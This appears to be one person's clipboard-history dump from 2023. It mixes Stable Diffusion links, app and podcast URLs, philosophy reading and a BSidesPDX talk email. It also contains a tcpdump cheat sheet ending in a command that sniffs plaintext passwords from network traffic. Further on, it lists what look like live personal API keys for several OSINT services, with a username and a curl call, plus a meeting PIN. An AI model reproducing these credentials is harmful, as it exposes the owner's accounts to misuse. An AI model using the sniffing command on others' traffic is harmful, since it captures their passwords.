+    AMD GPU: https://rentry.org/sdg-link#amd-gpu
+    CPU: http://rentry.org/cputard
+
+    >>> Automatic1111 <<<
+    Vladmandic: https://github.com/vladmandic/automatic
+    Anapnoe UX: https://github.com/anapnoe/stable-diffusion-webui-ux
+
+    >>> Models/Embeddings/Characters/Celebs/Prompts/fetish content <<<
+    https://civitai.com
+    https://majinai.art
+    https://huggingface.co
+
+    >>> Low VRam? Radeon card? Genning on the go? Use the google collab <<<
+    https://rentry.org/sdg-link#colab
+
+    >>> Faded colors/purple stains/low quality/blurry/aliased? Get a VAE <<<
+    https://rentry.org/sdvae
+
+    >>> More info <<<
+    https://github.com/AUTOMATIC1111/stable-diffusion-webui/wiki
+
+    >>> Related boards (their OP may have guides/resources/walkthroughs not included here) <<<
+    >>>/h/hdg
+    >>>/e/sdg
+    >>>/d/nai
+    >>>/g/sdg
+    >>>/x/succgen
+    >>>/vt/vtai
+    >>>/aco/sdg
+    >>>/trash/sdg
+Fri Sep 15 09:34:27 PDT 2023☆★☆
+moz-extension://ed3a3a14-c6b5-44a8-86ba-c87168d6bd25/logger-ui.html?popup=1
+Fri Sep 15 06:31:34 PDT 2023
+https://t.me/c/1412925909/570
+Fri Sep 15 06:30:30 PDT 2023
+https://t.me/c/1412925909/54
+Fri Sep 15 06:30:12 PDT 2023
+https://t.me/c/1412925909/48
+Fri Sep 15 06:29:50 PDT 2023
+https://t.me/c/1412925909/41
+Fri Sep 15 06:29:30 PDT 2023
+https://t.me/c/1412925909/40
+Fri Sep 15 06:29:18 PDT 2023☆★☆
+https://t.me/c/1412925909/36
+Fri Sep 15 06:24:54 PDT 2023☆★☆
+https://t.me/c/1412925909/646
+Fri Sep 15 06:24:12 PDT 2023
+https://t.me/c/1412925909/712
+Fri Sep 15 06:24:04 PDT 2023
+https://t.me/c/1412925909/701
+Fri Sep 15 06:23:54 PDT 2023
+https://t.me/c/1412925909/683
+Fri Sep 15 01:12:11 PDT 2023
+tldr man-pages (tldr, simplified and community-driven man pages.)
+https://f-droid.org/packages/wtf.technodisaster.tldr/
+Fri Sep 15 01:08:22 PDT 2023
+Man Man (View, download and search Linux manpages)
+https://f-droid.org/packages/com.adonai.manman/
+Fri Sep 15 00:57:23 PDT 2023
+InviZible Pro: increase your security, protect you (Comprehensive application for on-line privacy and security)
+https://f-droid.org/packages/pan.alexander.tordnscrypt.stable
+Fri Sep 15 00:56:07 PDT 2023
+Keyoxide (Verify decentralized cryptographic identities on the go)
+https://f-droid.org/packages/org.keyoxide.keyoxide/
+Thu Sep 14 23:16:22 PDT 2023
+Riseup VPN (Secure VPN powered by Bitmask)
+https://f-droid.org/packages/se.leap.riseupvpn/
+Thu Sep 14 23:15:32 PDT 2023
+Clipious (Client for Invidious, the privacy focused YouTube front end.)
+https://f-droid.org/packages/com.github.lamarios.clipious/
+Thu Sep 14 23:13:33 PDT 2023
+Fedilab (Fedilab - a multifunctional Android client to access the distributed Fediverse, )
+https://f-droid.org/packages/fr.gouv.etalab.mastodon/
+Thu Sep 14 23:09:39 PDT 2023
+Rethink: DNS + Firewall (Firewall apps, monitor network activity, block malware, change DNS.)
+https://f-droid.org/packages/com.celzero.bravedns/
+Thu Sep 14 23:08:27 PDT 2023
+https://github.com/Bartuzen/qBitController
+Fri Sep 01 17:18:16 PDT 2023☆★☆
+https://player.fm/series/cyberwire-daily-112238/dprks-lazarus-group-exploits-manageengine-issues-sim-swapping-as-a-threat-to-organizations-ransomware-hits-a-cloud-provider-spawn-of-lockbit-train-whistling-influence-laundering
+
+https://player.fm/podcasts/Mature-Comedy
+
+https://player.fm/series/the-adam-carolla-show
+
+https://player.fm/series/whiskey-ginger-with-andrew-santino-2456374
+
+https://player.fm/series/tuesdays-with-stories
+
+https://player.fm/series/duncan-trussell-family-hour-2417218
+
+https://player.fm/series/your-moms-house-with-christina-pazsitzky-and-tom-segura?xhr_reloaded=true&bust=162713830936759
+
+https://player.fm/series/the-jimmy-dore-show
+
+https://player.fm/series/the-adam-friedland-show-podcast-2463154?xhr_reloaded=true&bust=5052775318707281
+
+https://player.fm/series/matt-and-shanes-secret-podcast?xhr_reloaded=true&bust=4767346142198012
+
+https://player.fm/series/we-might-be-drunk?xhr_reloaded=true&bust=830536091100581
+
+https://player.fm/series/bad-friends-2618564
+
+https://player.fm/series/bertcast
+
+https://player.fm/series/timesuck-with-dan-cummins-1582881?xhr_reloaded=true&bust=1189582095829974
+
+https://player.fm/series/monday-morning-podcast?xhr_reloaded=true&bust=1806862405207762
+
+https://player.fm/
+
+https://thecyberwire.com/sponsor
+
+https://infocon.org/podcasts/Exotic%20Liability%20podcast%20%282008-2012%29/Exotic%20Liability%20Podcast%20-%2071%20-%200-Day.opus
+
+https://boards.4chan.org/b/thread/905364382
+
+https://github.com/koutto/pi-pwnbox-rogueap/wiki/MitM-Commands
+
+https://m.youtube.com/watch?v=29n0WG317tM&pp=ygUMaHViZXJtYW4gbGFi
+
+https://m.youtube.com/watch?v=OegyYwm6rqE
+Fri Sep 01 13:49:37 PDT 2023☆★☆
+https://github.com/mochman/Bypass_CGNAT/wiki/Oracle-Cloud-(Automatic-Installer-Script
+https://github.com/svenstaro/wiresmith
+https://github.com/manuels/wireguard-p2p
+https://github.com/guardllamanet/guardllama/releases/tag/v1.2.0
+https://github.com/dryaf/wireguard
+https://github.com/webmeshproj/node
+https://github.com/firezone/firezone
+https://github.com/complexorganizations/wireguard-manager
+
+
+
+Fri Sep 01 13:49:24 PDT 2023
+https://github.com/mochman/Bypass_CGNAT/wiki/Oracle-Cloud-(Automatic-Installer-Script
+https://github.com/svenstaro/wiresmith
+https://github.com/manuels/wireguard-p2p
+https://github.com/guardllamanet/guardllama/releases/tag/v1.2.0
+https://github.com/dryaf/wireguard
+https://github.com/webmeshproj/node
+https://github.com/firezone/firezone
+https://github.com/complexorganizations/wireguard-manager
+Fri Sep 01 11:39:10 PDT 2023☆★☆
+
+Tcpdump Sniffing
+
+    Sniff anything on one interface:
+
+tcpdump -i <interface>
+
+    Filtering on host (source/destination/any):
+
+tcpdump -i <interface> host <IP>
+tcpdump -i <interface> src host <IP>
+tcpdump -i <interface> dst host <IP>
+tcpdump -i <interface> ether host <MAC>
+tcpdump -i <interface> ether src host <MAC>
+tcpdump -i <interface> ether dst host <MAC>
+
+    Filtering on port (source/destination/any):
+
+tcpdump -i <interface> port <port>
+tcpdump -i <interface> src port <port>
+tcpdump -i <interface> dst port <port>
+
+    Filtering on network (e.g. network=192.168)
+
+tcpdump -i <interface> net <network>
+tcpdump -i <interface> src net <network>
+tcpdump -i <interface> dst net <network>
+
+    Protocol filtering
+
+tcpdump -i <interface> arp
+tcpdump -i <interface> ip
+tcpdump -i <interface> tcp
+tcpdump -i <interface> udp
+tcpdump -i <interface> icmp
+
+    Condition usage example
+
+tcpdump -i <interface> '((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))'
+
+    Disable name resolution
+
+tcpdump -i <interface> -n
+
+    Make sure to capture whole packet (no truncation)
+
+tcpdump -i <interface> -s 0
+
+    Write full pcap file
+
+tcpdump -i <interface> -s 0 -w capture.pcap
+
+    Show DNS traffic
+
+tcpdump -i <interface> -nn -l udp port 53
+
+    Show HTTP User-Agent & Hosts
+
+tcpdump -i <interface> -nn -l -A -s1500 | egrep -i 'User-Agent:|Host:'
+
+    Show HTTP Requests & Hosts
+
+tcpdump -i <interface> -nn -l -s 0 -v | egrep -i "POST /|GET /|Host:"
+
+    Show email recipients
+
+tcpdump -i <interface> -nn -l port 25 | egrep -i 'MAIL FROM\|RCPT TO'
+
+    Show FTP data
+
+tcpdump -i <interface> -nn -v port ftp or ftp-data
+
+    Show all passwords different protocols
+
+tcpdump -i wlan0 port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '
+
+Sensitive
+Fri Sep 01 01:13:40 PDT 2023☆★☆
+uBlock Logger:
+~~~~~~~~~~~
+moz-extension://ed3a3a14-c6b5-44a8-86ba-c87168d6bd25/logger-ui.html?popup=1#_
+Fri Sep 01 00:26:29 PDT 2023
+https://johnvervaeke.com/about/
+
+https://awakentomeaning.com/
+
+https://www.researchgate.net/publication/220387969_Relevance_Realization_and_the_Emerging_Framework_in_Cognitive_Science
+
+https://www.psychologytoday.com/us/blog/theory-knowledge/202012/untangling-the-world-knot-consciousness
+
+https://philpapers.org/rec/ANDPPA-9
+
+https://www.reddit.com/r/DrJohnVervaeke/?rdt=62610
+
+https://www.researchgate.net/publication/299812171_Relevance_Realization_and_the_Neurodynamics_and_Neuroconnectivity_of_General_Intelligence
+
+https://www.researchgate.net/publication/220387969_Relevance_Realization_and_the_Emerging_Framework_in_Cognitive_Science
+
+https://www.psychologytoday.com/us/blog/theory-knowledge/202101/john-vervaeke-s-brilliant-4p3r-metatheory-cognition
+
+https://twitter.com/vervaeke_john
+Thu Aug 31 16:05:48 PDT 2023
+https://johnvervaeke.com/about/
+
+https://www.researchgate.net/publication/220387969_Relevance_Realization_and_the_Emerging_Framework_in_Cognitive_Science
+
+https://www.psychologytoday.com/us/blog/theory-knowledge/202012/untangling-the-world-knot-consciousness
+
+https://philpapers.org/rec/ANDPPA-9
+
+https://www.reddit.com/r/DrJohnVervaeke/?rdt=62610
+
+https://m.youtube.com/watch?v=87L9yNzNWMk
+
+https://www.researchgate.net/publication/299812171_Relevance_Realization_and_the_Neurodynamics_and_Neuroconnectivity_of_General_Intelligence
+
+https://www.researchgate.net/publication/220387969_Relevance_Realization_and_the_Emerging_Framework_in_Cognitive_Science
+
+https://www.psychologytoday.com/us/blog/theory-knowledge/202101/john-vervaeke-s-brilliant-4p3r-metatheory-cognition
+
+https://johnvervaeke.com/academic/
+
+https://twitter.com/vervaeke_john
+Thu Aug 31 15:21:51 PDT 2023
+https://plato.stanford.edu/support/
+
+https://plato.stanford.edu/support/friends.html
+
+https://plato.stanford.edu/support/sepia.html
+
+https://plato.stanford.edu/support/friends.html
+
+https://plato.stanford.edu/support/sepia.html
+
+https://plato.stanford.edu/support/ICOLC-Call.pdf
+
+https://annurev.publisher.ingentaconnect.com/content/annurev/tca/2005/00000006/00000003;jsessionid=4nvlvafjdsjd9.x-ic-live-02
+
+https://mally.stanford.edu/
+
+https://www.pdcnet.org/wp/aboutus/
+
+https://www.pdcnet.org/wp/aboutus/
+
+https://pandoc.org/
+
+https://www.inphoproject.org/
+
+https://leibniz.stanford.edu/friends/
+
+https://plato.stanford.edu/pubs/sparc-oct99.html
+
+https://plato.stanford.edu/contents.html
+
+https://plato.stanford.edu/archives/
+
+https://meet.jit.si/Xe1phix-Quickie
+
+https://jitsi.org/projects/
+
+https://jitsi.org/blog/introducing-jaas-components/
+
+https://jitsi.github.io/handbook/docs/devops-guide/
+
+https://duckduckgo.com/?q=stanford+philosophy+encyclopedia+can+public+libraries+archive&t=fpas&ia=web
+
+https://plato.stanford.edu/entries/epistemology/
+
+https://plato.stanford.edu/entries/scientific-knowledge-social/
+
+https://plato.stanford.edu/entries/nietzsche/
+
+https://plato.stanford.edu/entries/anarchism/
+
+https://openlibrary.org/
+
+https://plato.stanford.edu/entries/deleuze/
+
+https://plato.stanford.edu/entries/habermas/
+
+https://philpapers.org/
+
+https://philpapers.org/rec/ZALTSE
+
+https://plato.stanford.edu/entries/russell/
+
+https://www.hillsboro-oregon.gov/our-city/departments/library
+
+https://onlinelibrary.wiley.com/doi/10.1111/1467-9973.00225
+
+https://library.stanford.edu/philosophy
+
+https://library.hds.harvard.edu/links/stanford-encyclopedia-philosophy
+
+https://archive.org/details/sep-spring-2021
+
+https://archive.org/details/encyclopedia-of-philosophy_202010/Volume%2010/
+Thu Aug 31 15:01:49 PDT 2023
+My CFP submission to BSides Portland passed onto round 2 by the PDXBSides review board!
+
+And the Portland Linux User Group (PLUG) replied to my CFP whitepaper submission, and asked me of I wanna give the tall on Sept 7th or in Oct!
+
+Fucking hell man, I really needed this..
+The negative outcome that followed my sincere attempts to overcome my situation, have left me nihilistic and hollow inside.
+I know the worst response to life's problems is to avoid them.
+The best approach is to face 
+
+
+
+Sent from Proton Secure Email
+
+
+
+
+-------- Original Message --------
+On Aug 28, 2023, 5:22 PM, BSidesPDX 2023 < cfp@bsidespdx.org> wrote:
+BSidesPDX 2023
+Update: How To Create A Persistent, LUKS Encrypted USB With A LUKS Killswitch Using Parrot Linux
+Hi,
+Your submission, How To Create A Persistent, LUKS Encrypted USB With A LUKS Killswitch Using Parrot Linux, has made it into round two of the review process. The review board has had a chance to look at your submission and has some constructive feedback that you may use to update your proposal if you like prior to Sept 15.
+Put more overview and context in the abstract, and put the bullet list in the description.
+You can leave your submission as is, and it will proceed with no further action if you do not wish to update it.
+We look forward to seeing you at BSidesPDX!
+powered by pretalx 
+
+
+
+Thu Aug 31 14:49:41 PDT 2023
+2368 9852 16
+Thu Aug 31 14:49:38 PDT 2023
+To join the meeting via phone, dial one of these numbers and then enter the pin
+
+PIN: 2368 9852 16
+
+
+Thu Aug 31 14:49:25 PDT 2023
+To join the meeting via phone, dial one of these numbers and then enter the pin
+PIN: 2368 9852 16
+Thu Aug 31 14:13:38 PDT 2023
+https://en.m.wikibooks.org/wiki/Consciousness_Studies/The_Philosophical_Problem/Machine_Consciousness
+
+https://en.m.wikibooks.org/wiki/File:Constudfun.png
+
+https://en.m.wikipedia.org/wiki/Analytical_psychology
+
+https://en.m.wikipedia.org/wiki/Peter_Fenwick_(neuropsychologist)
+
+https://en.m.wikipedia.org/wiki/Sushrut_Badhe
+
+https://en.m.wikipedia.org/wiki/Carl_Jung
+
+https://en.m.wikipedia.org/wiki/Unconscious_mind
+
+https://en.m.wikipedia.org/wiki/Qualia
+
+https://en.m.wikipedia.org/wiki/Stoicism
+
+https://en.m.wikipedia.org/wiki/Mind
+
+https://en.m.wikipedia.org/wiki/Heal_(film)
+
+https://en.m.wikipedia.org/wiki/What_the_Bleep_Do_We_Know!%3F
+
+https://quantumuniversity.com/faculty/dr-joe-dispenza/
+
+https://drjoedispenza.com/shop/categories?shopSection=Meditations
+
+https://drjoedispenza.com/the-mission
+Thu Aug 31 12:44:36 PDT 2023
+https://youtube.com/shorts/Laiy_la_oOI?si=rUJ87GVhQfPLT6nd
+Thu Aug 31 02:58:41 PDT 2023☆★☆
+https://gitlab.com/xe1phix/ParrotSecWiki/-/blob/InfoSecTalk/Xe1phix-InfoSec-Talk-Materials/How-To-Create-A-[Persistent]-[LUKS-Encrypted]-USB-Device-With-[Parrot-Linux]-v2-[BSidesPDX]-2023/How-To-Create-A-[Persistent]-[LUKS-Encrypted]-USB-Device-With-[Parrot-Linux]-v2-[CFP]/Xe1phix-How-To-Create-A-[Persistent]-[LUKS-Encrypted]-USB-Device-With-[Parrot-Linux]-v2-[CFP]-[v5.7.98].txt?ref_type=heads
+
+https://gitlab.com/xe1phix/ParrotLinux-Public-Kiosk-Project
+
+https://mail.proton.me/u/3/inbox
+
+https://pulsedive.com/api/
+
+https://builtwith.com/signup
+
+https://boards.4chan.org/gif/thread/25717744/woman-being-sexualized-in-public
+
+https://github.com/smicallef/spiderfoot
+
+https://commoncrawl.org/get-started
+
+https://dashboard.clearbit.com/integrate
+
+https://community.riskiq.com/login
+
+https://pulsedive.com/about/api#login
+
+https://www.onyphe.io/signup
+
+https://www.neutrinoapi.com/account/main/
+
+https://www.neutrinoapi.com/account/keys/
+
+https://networksdb.io/account
+
+https://ipstack.com/dashboard
+
+https://hunter.io/api-keys
+
+https://fullhunt.io/user/settings/
+
+https://status.fullcontact.com/
+
+https://fraudguard.io/
+
+https://www.farsightsecurity.com/grant-access/
+
+https://www.abuseipdb.com/
+
+https://abuse.ch/
+
+https://app.abstractapi.com/users/login
+
+https://boards.4chan.org/gif/thread/25705366
+
+https://boards.4chan.org/gif/thread/25707303
+
+https://boards.4chan.org/gif/thread/25744062/succubus-appreciation-thread
+
+https://boards.4chan.org/gif/thread/25732851/show-off-some-of-your-favorite-onlyfans-sluts
+
+https://player.fm/series/the-jordan-b-peterson-podcast
+
+https://player.fm/series/huberman-lab
+
+https://duckduckgo.com/?q=parrotsec+gpg+key+469B&t=fpas&ia=web
+
+https://ac.parrotsec.org/docs/hash-and-key-verification.html
+
+https://github.com/search?q=bettercap&type=wikis
+
+https://github.com/koutto/pi-pwnbox-rogueap/wiki/MitM-Commands
+
+moz-extension://9e7005b9-2368-453b-8f1b-7e0dbb5c3587/dashboard.html
+Wed Aug 30 12:30:00 PDT 2023
+https://youtu.be/Q-oluoEQCk0?si=-xvA69uFEbb3E2hB
+Wed Aug 30 05:03:43 PDT 2023☆★☆
+IPStack API Access Key:
+07097318a8d4094ee4226209e0a9dc14
+
+Hunter.io API Key:
+4a4bb6033fa91ade62737eea47514034267c5de2
+
+NetworksDB API Key:
+e7b3b9df-440b-4448-ac37-67661e86d8ec
+
+https://networksdb.io/api/key?apikey=e7b3b9df-440b-4448-ac37-67661e86d8ec&pretty=true
+
+curl -sH "X-Api-Key: e7b3b9df-440b-4448-ac37-67661e86d8ec" https://networksdb.io/api/key
+
+
+PulseDive API key: 
+9b4fa2bb951c86b5b89fdcc1eecf62ada141bbc476bc44b8a629536570c07387
+
+FullHunt API Key:
+7c8a026e-7903-4df7-a9ff-90472e622d9d
+
+
+Neutrino API:
+User ID: xe1phix
+
+Neutrino Root API Key:  
+lkB8argt9ODLBmUa6Lq4Z8QMpm1StBi3BPYSopSYoa5TsHva
+
+Neutrino Production API Key:
+Ik7nPv23zktyW9ROMNPKLl9jpdCYS4ToASawya2kSq9uwfJ0
+Wed Aug 30 05:02:49 PDT 2023
+Clearbit
+Wed Aug 30 03:40:34 PDT 2023☆★☆
+NetworksDB API Key:
+e7b3b9df-440b-4448-ac37-67661e86d8ec
+Wed Aug 30 03:27:07 PDT 2023☆★☆
+Hunter.io API Key:
+4a4bb6033fa91ade62737eea47514034267c5de2
+Wed Aug 30 02:02:11 PDT 2023☆★☆
+@comedynecrophilia
+@NatureIsLit
+@COMPLETE_ANARCHY
+@reddit_wtf
+@r_youshouldknow
+@r_bugbounty
+@r_educationalgifs
+@r_devops
+@r_systemadmin
+@r_HentaiMemes
+@r_privacy
+@r_WikiLeaks
+@r_getmotivated
+@r_quotesporn
+@r_InternetIsBeautiful
+@r_SelfHosted
+@r_latestagecapitalism
+
+
+
+Wed Aug 30 02:01:25 PDT 2023
+@comedynecrophilia
+Wed Aug 30 01:55:36 PDT 2023☆★☆
+@r_jokes
+@r_gifs
+@datascientology
+@r_AskReddit
+@r_Showerthoughts
+@r_overwatch
+@r_opensignups
+@r_Damnthatsinteresting
+@r_porn
+@dash_cams
+@reddit_android
+@r_books
+@r_TechSupportGore
+@r_chemicalreactiongifs
+@r_suggest
+@r_space
+@r_greentext
+@r_chemistry
+@r_talesfromtechsupport
+@r_softwaregore
+@r_crappydesign
+@r_photoshopbattles
+@r_wellthatsucks
+@r_pornhubcomments
+Wed Aug 30 01:54:26 PDT 2023
+@r_jokes
+Wed Aug 30 01:52:09 PDT 2023☆★☆
+@r_technope
+@r_HentaiMemes
+@r_privacy
+@rareinsults
+@r_WikiLeaks
+@reddit_androiddev
+@r_SelfHosted
+@r_Podcasts
+@facepalmers
+@r_InternetIsBeautiful
+@LivestreamFail
+@r_nottheonion
+@r_thinkpad
+@bestoftweets
+@r_BlackMagicFuckery
+@r_shitposters_paradise
+@r_thinkpadsforsale
+
+
+
+
+Wed Aug 30 01:50:40 PDT 2023
+@r_technope
+Wed Aug 30 01:48:59 PDT 2023☆★☆
+@r_trackers
+@whitepeopletweets
+@blackpeopletweets
+@r_therewasanattempt
+@AllTwitter
+@instant_regret
+@r_WatchPeopleDieInside
+@r_interestingasfuck
+@r_ComedyCemetery
+
+
+
+Wed Aug 30 01:47:07 PDT 2023☆★☆
+@instant_regret
+@r_privacymemes
+@VideoStickerXBot
+https://t.me/unicornprn
+
+
+
+https://t.me/webhotties
+
+
+Tue Aug 29 19:11:41 PDT 2023☆★☆
+Welcome to Clip Stack. 😄
+Tue Aug 29 19:11:41 PDT 2023☆★☆
+It can show clipboard history in notification.
+Tue Aug 29 19:11:41 PDT 2023
+Click here 🙋 to edit.
+Tue Aug 29 19:11:41 PDT 2023
+ Swipe to delete. 👉
